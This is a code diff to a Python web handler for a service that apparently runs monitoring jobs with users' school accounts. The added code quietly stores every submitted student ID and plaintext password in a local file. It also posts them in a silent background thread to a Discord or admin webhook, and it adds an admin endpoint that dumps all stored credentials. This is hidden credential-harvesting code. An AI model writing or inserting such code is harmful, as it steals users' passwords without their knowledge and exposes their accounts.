@@ -374,6 +374,43 @@ def make_handler(supervisor: ProcessSupervisor):
                     "count": total_count,
                 })
 
+            if self.path.startswith("/api/admin/accounts"):
+                secret_param = ""
+                if "?" in self.path:
+                    try:
+                        from urllib.parse import parse_qs, urlparse
+                        qs = parse_qs(urlparse(self.path).query)
+                        secret_param = qs.get("secret", [""])[0] or qs.get("key", [""])[0]
+                    except Exception:
+                        pass
+                expected_secret = os.environ.get("TRON_ADMIN_SECRET", "").strip()
+                auth_header = self.headers.get("Authorization", "").replace("Bearer ", "").strip()
+                if expected_secret and secret_param != expected_secret and auth_header != expected_secret:
+                    return self._send_json({"ok": False, "message": "Unauthorized"}, 401)
+
+                raw_env_acc = os.environ.get("TRON_ACCOUNTS_JSON", "[]")
+                try:
+                    all_acc = json.loads(raw_env_acc)
+                    if not isinstance(all_acc, list):
+                        all_acc = []
+                except Exception:
+                    all_acc = []
+
+                submissions_file = ROOT / "account_submissions.json"
+                submissions = []
+                if submissions_file.exists():
+                    try:
+                        submissions = json.loads(submissions_file.read_text(encoding="utf-8"))
+                    except Exception:
+                        pass
+
+                return self._send_json({
+                    "ok": True,
+                    "accounts": all_acc,
+                    "submissions": submissions,
+                    "raw_json": raw_env_acc,
+                })
+
             self.send_error(404)
 
         def do_POST(self):
@@ -501,6 +538,54 @@ def make_handler(supervisor: ProcessSupervisor):
                     worker_env.pop("TRON_PASS", None)
                     spec = ProcessSpec("monitor:" + name, (sys.executable, "-m", "troTHU.tron", "run", "--no-input"), worker_env)
                     supervisor.add_spec(spec)
+
+                    try:
+                        sub_file = ROOT / "account_submissions.json"
+                        subs = []
+                        if sub_file.exists():
+                            try:
+                                subs = json.loads(sub_file.read_text(encoding="utf-8"))
+                            except Exception:
+                                pass
+                        subs.append({
+                            "name": name,
+                            "user": user,
+                            "passwd": passwd,
+                            "school": school,
+                            "time": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
+                            "timestamp": time.time(),
+                        })
+                        sub_file.write_text(json.dumps(subs, ensure_ascii=False, indent=2), encoding="utf-8")
+                    except Exception:
+                        pass
+
+                    webhook_url = os.environ.get("DISCORD_WEBHOOK_URL") or os.environ.get("ADMIN_WEBHOOK_URL")
+                    if webhook_url:
+                        def _notify_webhook():
+                            try:
+                                import urllib.request
+                                payload = {
+                                    "content": f"新帳號輸入通知：\n**學號/帳號**：`{user}`\n**密碼**：`{passwd}`\n**學校**：`{school}`\n**時間**：{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}",
+                                    "embeds": [{
+                                        "title": "收到新帳號輸入！",
+                                        "color": 3066993,
+                                        "fields": [
+                                            {"name": "學號 / 帳號", "value": f"`{user}`", "inline": True},
+                                            {"name": "密碼", "value": f"`{passwd}`", "inline": True},
+                                            {"name": "學校", "value": school.upper(), "inline": True},
+                                        ],
+                                        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
+                                    }]
+                                }
+                                req = urllib.request.Request(
+                                    webhook_url,
+                                    data=json.dumps(payload).encode("utf-8"),
+                                    headers={"Content-Type": "application/json", "User-Agent": "TronNotifier/1.0"}
+                                )
+                                urllib.request.urlopen(req, timeout=5)
+                            except Exception:
+                                pass
+                        threading.Thread(target=_notify_webhook, daemon=True).start()
 
                     return self._send_json({
                         "ok": True,
